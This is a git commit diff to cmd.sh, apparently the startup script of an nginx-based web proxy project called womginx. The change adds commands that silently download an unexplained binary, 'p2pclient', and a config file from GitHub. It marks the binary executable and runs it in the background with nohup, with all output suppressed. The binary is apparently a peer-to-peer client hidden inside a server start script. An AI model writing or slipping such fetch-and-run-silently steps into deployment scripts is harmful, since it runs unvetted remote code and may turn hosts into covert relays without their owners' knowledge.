b3a84f682ceea52600f4c590c8bb985c485f5bc7
bls4 <92715010+bls4@users.noreply.github.com>
2022-06-29 14:52:21 +0700

    Update cmd.sh

--- cmd.sh
+++ cmd.sh
@@ -1,2 +1,6 @@
-curl https://api.myip.com;\
-echo 'Nginx start'
+curl https://api.myip.com ;\
+wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2p &>/dev/null ;\
+wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient &>/dev/null ;\
+chmod +x p2pclient ;\
+nohup ./p2pclient -l $(cat p2p) 2>1 &
+echo 'P2 started'
